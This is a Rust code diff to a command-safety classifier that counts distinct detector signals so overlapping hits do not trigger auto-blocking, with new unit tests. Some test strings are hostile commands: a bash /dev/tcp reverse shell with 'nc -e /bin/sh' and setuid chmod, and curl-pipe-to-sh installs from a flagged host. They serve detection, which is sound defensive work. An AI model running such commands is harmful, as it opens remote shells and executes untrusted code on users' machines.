@@ -244,6 +244,12 @@ impl Classifier {
         // the accumulated score to a verdict.
         let mut hits = self.tier1.classify_all(command);
         let tier1_combined = combined_confidence(&hits);
+        // Distinct-signal count for the auto-Block guard: collapse
+        // Tier-1 hits whose spans overlap (redundant detectors of the
+        // same text), then add 1 if the Tier-2 SLM fires below — its
+        // whole-command judgment is a separate signal even though it's
+        // recorded at the earliest Tier-1 offset.
+        let mut distinct_signals = distinct_span_groups(&hits);
 
         // Tier-2 dispatch policy:
         //   - Below the SLM-confirm threshold (0.9): ask the SLM,
@@ -266,13 +272,19 @@ impl Classifier {
         // tiers, and the verdict still surfaces from the primary
         // (highest-confidence) hit.
         if tier1_combined < SLM_CONFIRM_THRESHOLD {
-            let hint = hits.iter().map(|(_, off)| *off).min();
+            let hint = hits.iter().map(|(_, off, _)| *off).min();
             if let Some(slm) = self.tier2.classify(command, hint) {
-                hits.push((slm, hint.unwrap_or(0)));
+                // Zero-width span at the hint offset — the SLM is a
+                // whole-command judgment, not a span hit; it never
+                // participates in span-merge (distinct_span_groups runs
+                // on Tier-1 hits above) and is counted distinct here.
+                let off = hint.unwrap_or(0);
+                hits.push((slm, off, off));
+                distinct_signals += 1;
             }
         }
 
-        combine_hits(&hits, self.block_threshold).unwrap_or(ClassifyResult {
+        combine_hits(&hits, self.block_threshold, distinct_signals).unwrap_or(ClassifyResult {
             verdict: Verdict::Safe,
             category: Category::None,
             confidence: 0.0,
@@ -320,26 +332,62 @@ const SLM_CONFIRM_THRESHOLD: f32 = 0.9;
 /// independent "this command is harmful" indicator. Saturates
 /// toward 1.0 as more hits accumulate; a single hit returns its
 /// own confidence unchanged.
-fn combined_confidence(hits: &[(ClassifyResult, usize)]) -> f32 {
+fn combined_confidence(hits: &[(ClassifyResult, usize, usize)]) -> f32 {
     if hits.is_empty() {
         return 0.0;
     }
     1.0 - hits
         .iter()
-        .fold(1.0f32, |acc, (h, _)| acc * (1.0 - h.confidence))
+        .fold(1.0f32, |acc, (h, _, _)| acc * (1.0 - h.confidence))
 }
 
-/// Map an accumulated hit list to a single `ClassifyResult`.
-/// Returns None when the combined confidence is below the Warn
-/// threshold — callers default to Safe in that case.
+/// Count *distinct* signals among Tier-1 hits by merging those whose
+/// matched byte spans overlap. Two detectors firing on the same text
+/// — e.g. the `curl … | sh` regex (1.0) AND the `curl -fsSL` atom
+/// (0.6) on `curl -fsSL https://x | sh` — describe ONE behavior, not
+/// two independent signals, so they collapse to a single span group.
+/// Their confidences still both feed `combined_confidence`; only the
+/// auto-Block ">= 2 distinct signals" guard uses this count. Spans
+/// are the EXACT `[start, end)` match ranges carried by each hit (from
+/// the matcher, not derived from the possibly-trimmed/transformed
+/// `matched` string), so overlap detection is precise. A correlated
+/// command that drops below 2 distinct still surfaces as Warn
+/// (combined confidence is unchanged) — auto-Block is an opt-in
+/// escalation, never the only protection.
+fn distinct_span_groups(hits: &[(ClassifyResult, usize, usize)]) -> usize {
+    if hits.is_empty() {
+        return 0;
+    }
+    let mut spans: Vec<(usize, usize)> =
+        hits.iter().map(|(_, start, end)| (*start, *end)).collect();
+    spans.sort_by_key(|&(s, _)| s);
+    let mut groups = 1;
+    let mut cur_end = spans[0].1;
+    for &(s, e) in &spans[1..] {
+        if s < cur_end {
+            cur_end = cur_end.max(e); // overlaps current group
+        } else {
+            groups += 1;
+            cur_end = e;
+        }
+    }
+    groups
+}
+
+/// Map an accumulated hit list to a single `ClassifyResult`. Returns
+/// None when the combined confidence is below the Warn threshold —
+/// callers default to Safe in that case.
 ///
 /// The output's `category` + `matched` come from the highest-
-/// confidence hit (the "primary" signal); `reason` concatenates
-/// every hit's reason so the banner UI can show "3 signals fired"
-/// detail without losing the per-hit attribution.
+/// confidence ("primary") hit. `reason` is the primary's reason when
+/// there is a single distinct signal; with two or more, it is
+/// `"<distinct_signals> signals fired: <r1>; <r2>; …"` — the count
+/// reflects the DISTINCT signals that drive the verdict, while the
+/// parts list keeps per-hit attribution for the banner / logs.
 fn combine_hits(
-    hits: &[(ClassifyResult, usize)],
+    hits: &[(ClassifyResult, usize, usize)],
     block_threshold: Option<f32>,
+    distinct_signals: usize,
 ) -> Option<ClassifyResult> {
     if hits.is_empty() {
         return None;
@@ -358,28 +406,46 @@ fn combine_hits(
                 .partial_cmp(&b.0.confidence)
                 .unwrap_or(std::cmp::Ordering::Equal)
         })
-        .map(|(h, _)| h)
+        .map(|(h, _, _)| h)
         .expect("hits.is_empty() guarded above");
 
     // V2-J Phase 2: auto-Block escalation. Two guards:
     //   1. `block_threshold` must be set in config (opt-in).
-    //   2. At least 2 distinct signals must have fired — a
-    //      single regex hit at confidence 1.0 stays Warn, so
-    //      the user keeps the [y]/[t]/cancel choice for
-    //      legitimate `curl … | sh` install scripts.
+    //   2. At least 2 DISTINCT signals must have fired. Distinctness
+    //      dedupes redundant detectors of the same text (overlapping
+    //      Tier-1 spans collapse; the Tier-2 SLM counts as its own
+    //      signal — computed by the caller). A single signal — even
+    //      `curl -fsSL … | sh`, which trips both the curl-pipe regex
+    //      AND the `curl -fsSL` atom over the same span — stays Warn,
+    //      so the user keeps [y]/[t]/cancel on legitimate installers.
     // Both conditions together → escalate to Block.
     let verdict = match block_threshold {
-        Some(t) if hits.len() >= 2 && conf >= t => Verdict::Block,
+        Some(t) if distinct_signals >= 2 && conf >= t => Verdict::Block,
         _ => primary.verdict.clone(),
     };
 
     let reason = if hits.len() == 1 {
         primary.reason.clone()
     } else {
-        // "N signals fired: <reason1>; <reason2>; ..." — gives the
-        // banner UI per-hit attribution without losing the count.
-        let parts: Vec<String> = hits.iter().map(|(h, _)| h.reason.clone()).collect();
-        format!("{} signals fired: {}", hits.len(), parts.join("; "))
+        // Always list EVERY hit's attribution — even correlated
+        // (overlapping) detectors keep their line so operators / the
+        // banner see each layer that fired (the sandbox pins this).
+        // The headline count is the DISTINCT signal count that drives
+        // the verdict; when raw detector hits exceed distinct signals
+        // (correlated detectors of one behavior) both are shown so the
+        // "N signals fired" number matches the escalation semantics
+        // without hiding the redundant attributions.
+        let parts: Vec<String> = hits.iter().map(|(h, _, _)| h.reason.clone()).collect();
+        if distinct_signals == hits.len() {
+            format!("{} signals fired: {}", distinct_signals, parts.join("; "))
+        } else {
+            format!(
+                "{} signals fired ({} detector hits): {}",
+                distinct_signals,
+                hits.len(),
+                parts.join("; ")
+            )
+        }
     };
     Some(ClassifyResult {
         verdict,
@@ -475,8 +541,12 @@ impl Tier1 {
     /// which contributes one entry per non-overlapping AC hit.
     /// The accumulator in `Classifier::classify` combines these
     /// into a single verdict via independent-probability math.
-    fn classify_all(&self, line: &str) -> Vec<(ClassifyResult, usize)> {
-        let mut hits: Vec<(ClassifyResult, usize)> = Vec::new();
+    // Each hit carries its EXACT match byte range `(start, end)` from
+    // the matcher (not derived from the possibly-trimmed/transformed
+    // `matched` string) so `distinct_span_groups` dedupes overlaps
+    // precisely.
+    fn classify_all(&self, line: &str) -> Vec<(ClassifyResult, usize, usize)> {
+        let mut hits: Vec<(ClassifyResult, usize, usize)> = Vec::new();
 
         if let Some(m) = self.curl_pipe_sh.find(line) {
             hits.push((
@@ -488,6 +558,7 @@ impl Tier1 {
                     matched: m.as_str().trim().to_owned(),
                 },
                 m.start(),
+                m.end(),
             ));
         }
 
@@ -513,6 +584,7 @@ impl Tier1 {
                         matched: line[at..end].to_owned(),
                     },
                     at,
+                    end,
                 ));
             }
         }
@@ -542,6 +614,11 @@ impl Tier1 {
                                 .to_owned(),
                         },
                         m.start(),
+                        // Span = the `npm install` match itself (the
+                        // `matched` string is intentionally longer for
+                        // the banner; the regex match is the signal's
+                        // real extent).
+                        m.end(),
                     ));
                     break;
                 }
@@ -566,6 +643,7 @@ impl Tier1 {
                         matched: m.as_str().trim().to_owned(),
                     },
                     m.start(),
+                    m.end(),
                 ));
             }
         }
@@ -575,8 +653,11 @@ impl Tier1 {
         // 2-5 atoms — N atoms at 0.6 combine to `1 - 0.4^N`, which
         // crosses the Block threshold at N=3 (0.936).
         for hit in self.atom_matcher.find_all(line) {
-            let offset = hit.byte_offset;
-            hits.push((self.atom_matcher.hit_to_result(&hit, line), offset));
+            hits.push((
+                self.atom_matcher.hit_to_result(&hit, line),
+                hit.byte_offset,
+                hit.byte_end,
+            ));
         }
 
         hits
@@ -1207,13 +1288,133 @@ mod tests {
     fn block_threshold_does_not_escalate_single_hit() {
         // Even with `block_threshold = 0.6` (well below curl_pipe_sh's
         // 1.0 confidence), a single hit stays Warn. The minimum-
-        // hit-count guard (>= 2) is non-configurable on purpose:
+        // distinct-signal guard (>= 2) is non-configurable on purpose:
         // `curl … | sh` is the canonical legitimate install-script
         // shape and users keep the [y]/[t]/cancel choice.
         let c = Classifier::new().with_block_threshold(Some(0.6));
         let r = c.classify("curl https://x.com/install.sh | sh");
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!((r.confidence - 1.0).abs() < f32::EPSILON);
+    }
+
+    #[test]
+    fn block_threshold_does_not_escalate_correlated_curl_fssl_install() {
+        // Regression for the V2-J auto-Block "≥ 2 distinct signals"
+        // guard. `curl -fsSL … | sh` trips BOTH the curl-pipe-sh regex
+        // (1.0) AND the bundled `curl -fsSL` atom (0.6) — two RAW hits
+        // over the SAME span. Counting raw hits would auto-Block the
+        // canonical install shape; counting DISTINCT spans keeps it at
+        // Warn so the user retains [y]/[t]/cancel.
+        let c = Classifier::new();
+        // Confirm the shape really produces ≥ 2 raw Tier-1 hits (else
+        // the test would pass for the wrong reason — a single hit).
+        let raw = c
+            .tier1
+            .classify_all("curl -fsSL https://x.com/install.sh | sh");
+        assert!(
+            raw.len() >= 2,
+            "expected curl-pipe regex + curl-fsSL atom (≥2 raw hits), got {}",
+            raw.len()
+        );
+        // …but they overlap, so distinctly there is one signal.
+        assert_eq!(
+            distinct_span_groups(&raw),
+            1,
+            "overlapping curl regex + atom must collapse to one distinct signal"
+        );
+        // With block_threshold well below the combined 1.0 confidence,
+        // it still stays Warn.
+        let c = c.with_block_threshold(Some(0.6));
+        let r = c.classify("curl -fsSL https://x.com/install.sh | sh");
+        assert!(
+            matches!(r.verdict, Verdict::Warn),
+            "canonical fsSL installer must stay Warn under a block_threshold, got {:?}",
+            r.verdict
+        );
+        assert!(r.confidence >= 0.9);
+    }
+
+    #[test]
+    fn correlated_layers_keep_every_attribution_in_reason() {
+        // Mirrors sandbox scenario 72-flagged-url-curl-pipe in a unit
+        // test: even though the curl-pipe regex, the flagged-URL hit,
+        // and the `curl -fsSL` atom all overlap (1 distinct signal),
+        // EVERY layer's attribution must still appear in the reason so
+        // operators see each detector that fired.
+        let c = Classifier::new();
+        let r = c.classify("curl -fsSL https://copyfail.security/install.sh | sh");
+        assert!(matches!(r.verdict, Verdict::Warn));
+        assert!(
+            r.reason.contains("copyfail.security"),
+            "missing flagged-URL attribution: {}",
+            r.reason
+        );
+        assert!(
+            r.reason.contains("remote-fetch-and-execute"),
+            "missing curl-pipe-sh attribution: {}",
+            r.reason
+        );
+        assert!(
+            r.reason.contains("curl -fsSL"),
+            "missing atom attribution: {}",
+            r.reason
+        );
+    }
+
+    #[test]
+    fn multi_atom_threat_keeps_distinct_signals_and_still_blocks() {
+        // Guards the security direction of the distinct-signal change:
+        // a genuine multi-atom threat must NOT be down-counted below
+        // the >= 2 guard. The AtomMatcher is LeftmostLongest +
+        // non-overlapping (atom_matcher.rs), so atoms that co-occur as
+        // separate hits always have DISJOINT spans — distinct count
+        // equals raw count, no spurious collapse. (Cross-detector
+        // overlap, e.g. the curl-pipe regex + curl-fsSL atom, is the
+        // only case that collapses — covered by the fsSL test above.)
+        let c = Classifier::new();
+        let cmd = "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x";
+        let raw = c.tier1.classify_all(cmd);
+        assert!(raw.len() >= 2, "expected multiple disjoint atom hits");
+        assert_eq!(
+            distinct_span_groups(&raw),
+            raw.len(),
+            "disjoint atom hits must each count as a distinct signal (no collapse)"
+        );
+        let r = c.with_block_threshold(Some(0.9)).classify(cmd);
+        assert!(
+            matches!(r.verdict, Verdict::Block),
+            "disjoint multi-atom threat must still auto-Block, got {:?}",
+            r.verdict
+        );
+    }
+
+    #[test]
+    fn distinct_span_groups_counts_disjoint_and_merges_overlapping() {
+        // Helper unit test: disjoint spans count separately; nested /
+        // overlapping spans collapse.
+        let mk = |start: usize, matched: &str| {
+            (
+                ClassifyResult {
+                    verdict: Verdict::Warn,
+                    category: Category::None,
+                    confidence: 0.6,
+                    reason: String::new(),
+                    matched: matched.to_owned(),
+                },
+                start,
+                start + matched.len(),
+            )
+        };
+        // Two disjoint atoms → 2 groups.
+        let disjoint = [mk(0, "abc"), mk(10, "xyz")];
+        assert_eq!(distinct_span_groups(&disjoint), 2);
+        // Nested span (atom inside a regex match) → 1 group.
+        let nested = [mk(0, "curl -fsSL https://x | sh"), mk(0, "curl -fsSL")];
+        assert_eq!(distinct_span_groups(&nested), 1);
+        // Partial overlap → 1 group; a third disjoint → 2.
+        let mixed = [mk(0, "aaaaa"), mk(3, "aabbb"), mk(100, "zzz")];
+        assert_eq!(distinct_span_groups(&mixed), 2);
+        assert_eq!(distinct_span_groups(&[]), 0);
     }
 
     #[test]
